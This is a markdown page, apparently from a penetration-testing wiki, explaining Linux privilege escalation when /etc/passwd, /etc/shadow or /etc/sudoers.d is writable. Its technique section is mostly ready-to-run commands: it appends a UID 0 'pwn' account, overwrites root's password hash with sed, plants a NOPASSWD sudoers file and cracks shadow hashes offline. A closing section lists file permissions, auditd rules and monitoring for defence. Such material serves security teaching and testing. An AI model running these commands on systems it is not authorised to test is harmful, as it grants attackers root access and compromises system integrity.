---
title: Writable /etc/passwd or /etc/shadow
slug: writable-passwd-shadow
---

> **TL;DR:** When `/etc/passwd` or `/etc/shadow` is world-writable (or writable by your group), append a UID 0 entry with a password you control and `su` to root.

## What it is
On Linux, user accounts are defined in `/etc/passwd` and password hashes (since shadow-utils) live in `/etc/shadow`. Both must be writable only by root. Permission drift — bad packaging, a sloppy `chmod -R` on `/etc`, an admin restoring a backup with wrong perms, a container that bind-mounts `/etc` with `rw` and `0666` — turns these files into a one-line privesc.

## Preconditions / where it applies
- A local shell on a Linux host
- Either `/etc/passwd` writable (works even without shadow) or `/etc/shadow` writable
- `su` and a working hash function (`openssl`, `python3 -c 'import crypt; ...'`, `mkpasswd`, or copy a known hash)

## Technique

**Step 1 — verify:**
```bash
ls -la /etc/passwd /etc/shadow
# -rw-rw-rw- 1 root root 1582 ... /etc/passwd        ← jackpot
# -rw-r----- 1 root shadow 998 ... /etc/shadow

# Or sometimes it's the group:
id
# uid=1001(user) gid=1001(user) groups=1001(user),42(shadow)
```

**Vector A — writable /etc/passwd.** Historically every system kept the password hash in `/etc/passwd`. If the second field is non-empty and a valid crypt hash, it still works as a fallback (login(1) checks passwd before shadow on most distros if shadow is missing/unreadable for that user). Add a new root-equivalent user:

```bash
# Generate a crypt-style hash
openssl passwd -1 -salt xyz pwn123
# $1$xyz$Ph7nFvb5...

# Append the user
echo 'pwn:$1$xyz$Ph7nFvb5...:0:0:root:/root:/bin/bash' >> /etc/passwd

su pwn
# password: pwn123
# id
# uid=0(root) ...
```

UID 0 + GID 0 is the trick — login name doesn't matter.

**Vector B — writable /etc/shadow.** Update the root hash instead of adding a user:
```bash
mkpasswd -m sha-512 pwn123
# $6$<salt>$<hash>...

# Replace the second field on the root line in /etc/shadow
sed -i 's|^root:[^:]*:|root:$6$<salt>$<hash>:|' /etc/shadow

su root
# password: pwn123
```

**Vector C — writable /etc/sudoers.d/.** Same impact, often easier to spot. Drop a file:
```bash
echo "$(id -un) ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/zz_admin
sudo -i
```
sudo requires sudoers files mode 0440 root:root — drop with the right perms or chmod after.

**Vector D — group `shadow` membership without file write.** Members of group `shadow` can read `/etc/shadow` (but not write). Read root's hash, run hashcat/john offline; if the hash is weak you crack it and `su`. Treat group `shadow` like group `wheel` for impact triage.

**Sanity check before destructive edits:** make a backup (`cp /etc/passwd /tmp/passwd.bak`) — corrupt passwd locks the system out of new logins immediately. Use `>>` not `>`.

## Detection and defence
- Default perms: `/etc/passwd` 644 root:root, `/etc/shadow` 640 root:shadow
- `chattr +i` on `/etc/passwd` and `/etc/shadow` in high-value hosts (note: blocks legitimate `passwd(1)` until cleared)
- File-integrity monitoring (AIDE, Tripwire, OSSEC); auditd watch:
  ```
  -w /etc/passwd -p wa -k passwd_mod
  -w /etc/shadow -p wa -k shadow_mod
  -w /etc/sudoers.d/ -p wa -k sudoers
  ```
- EDR: alert on appended UID 0 lines in `/etc/passwd`; new files in `/etc/sudoers.d/`
- Container images: don't bake writable `/etc` into builds; review `chmod -R` calls in Dockerfiles

## References
- [shadow(5)](https://man7.org/linux/man-pages/man5/shadow.5.html) — file format reference
- [HackTricks — Writable /etc](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-etcpasswd) — full recipe
- [PayloadsAllTheThings — Linux privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) — payload catalogue

Related: [[sudo-misconfig]], [[nfs-no-root-squash]], [[linux-privesc-vectors]].
